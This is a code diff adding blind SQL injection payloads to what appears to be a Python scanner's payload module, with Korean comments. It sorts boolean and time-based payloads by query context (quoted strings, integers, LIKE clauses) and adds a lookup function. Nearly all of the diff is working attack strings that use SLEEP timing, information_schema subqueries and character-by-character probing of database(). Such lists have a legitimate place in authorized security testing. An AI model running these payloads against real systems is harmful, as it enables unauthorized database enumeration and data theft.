@@ -182,6 +182,60 @@ def get_by_strength(strength: str = "MEDIUM", orig: str = "1") -> List[Payload]:
     return _limit(payloads, strength)
 
 
+# 컨텍스트별 Blind SQLi — 키: SQL 컨텍스트 타입
+BLIND_SQLI: Dict[str, List[Payload]] = {
+
+    # 싱글쿼트 문자열 컨텍스트 (WHERE col = 'INJECT')
+    "string_sq": [
+        {"type": "BOOLEAN",    "family": "and_true",    "payload": "test' AND '1'='1' -- "},
+        {"type": "BOOLEAN",    "family": "and_false",   "payload": "test' AND '1'='2' -- "},
+        {"type": "BOOLEAN",    "family": "subq_tables", "payload": "test' AND (SELECT 1 FROM information_schema.tables LIMIT 1)=1 -- "},
+        {"type": "BOOLEAN",    "family": "db_len",      "payload": "test' AND LENGTH(database())>0 -- "},
+        {"type": "BOOLEAN",    "family": "db_char",     "payload": "test' AND SUBSTR(database(),1,1)>'a' -- "},
+        {"type": "TIME_BASED", "family": "and_sleep",   "payload": "test' AND 0 IN (SELECT SLEEP(5)) -- "},
+        {"type": "TIME_BASED", "family": "if_sleep",    "payload": "test' AND IF(1=1,SLEEP(5),0) -- "},
+    ],
+
+    # 정수형 컨텍스트 (WHERE id = INJECT)
+    "integer": [
+        {"type": "BOOLEAN",    "family": "and_true",    "payload": "1 AND 1=1-- -"},
+        {"type": "BOOLEAN",    "family": "and_false",   "payload": "1 AND 1=2-- -"},
+        {"type": "BOOLEAN",    "family": "subq_tables", "payload": "1 AND (SELECT 1 FROM information_schema.tables LIMIT 1)=1-- -"},
+        {"type": "BOOLEAN",    "family": "db_len",      "payload": "1 AND LENGTH(database())>0-- -"},
+        {"type": "BOOLEAN",    "family": "db_char",     "payload": "1 AND SUBSTR(database(),1,1)>'a'-- -"},
+        {"type": "TIME_BASED", "family": "and_sleep",   "payload": "1 AND 0 IN (SELECT SLEEP(5))-- -"},
+        {"type": "TIME_BASED", "family": "if_sleep",    "payload": "1 AND IF(1=1,SLEEP(5),0)-- -"},
+    ],
+
+    # 더블쿼트 문자열 컨텍스트 (WHERE col = "INJECT")
+    "string_dq": [
+        {"type": "BOOLEAN",    "family": "and_true",    "payload": 'val" AND "1"="1" -- '},
+        {"type": "BOOLEAN",    "family": "and_false",   "payload": 'val" AND "1"="2" -- '},
+        {"type": "BOOLEAN",    "family": "subq_tables", "payload": 'val" AND (SELECT 1 FROM information_schema.tables LIMIT 1)=1 -- '},
+        {"type": "BOOLEAN",    "family": "db_len",      "payload": 'val" AND LENGTH(database())>0 -- '},
+        {"type": "TIME_BASED", "family": "and_sleep",   "payload": 'val" AND 0 IN (SELECT SLEEP(5)) -- '},
+        {"type": "TIME_BASED", "family": "if_sleep",    "payload": 'val" AND IF(1=1,SLEEP(5),0) -- '},
+    ],
+
+    # LIKE 절 + 괄호 닫기 컨텍스트 (WHERE (col LIKE '%INJECT%'))
+    "like_string": [
+        {"type": "BOOLEAN",    "family": "paren_true",        "payload": "%' AND 1=1)-- -"},
+        {"type": "BOOLEAN",    "family": "paren_false",       "payload": "%' AND 1=2)-- -"},
+        {"type": "BOOLEAN",    "family": "paren_subq_tables", "payload": "%' AND (SELECT 1 FROM information_schema.tables LIMIT 1)=1)-- -"},
+        {"type": "BOOLEAN",    "family": "paren_db_len",      "payload": "%' AND LENGTH(database())>0)-- -"},
+        {"type": "BOOLEAN",    "family": "paren_db_char",     "payload": "%' AND SUBSTR(database(),1,1)>'a')-- -"},
+        {"type": "TIME_BASED", "family": "paren_sleep",       "payload": "%') AND SLEEP(5)-- -"},
+        {"type": "TIME_BASED", "family": "if_sleep",          "payload": "%' AND IF(1=1,SLEEP(5),0))-- -"},
+        {"type": "TIME_BASED", "family": "and_sleep",         "payload": "%' AND 0 IN (SELECT SLEEP(5)) -- -"},
+    ],
+}
+
+
+def get_blind_sqli(context: str) -> List[Payload]:
+    """SQL 컨텍스트 타입 → Blind SQLi 페이로드 리스트 반환. 없으면 빈 리스트."""
+    return BLIND_SQLI.get(context.lower(), [])
+
+
 def get_all(orig: str = "1") -> List[Payload]:
     return (
         ERROR_BASED
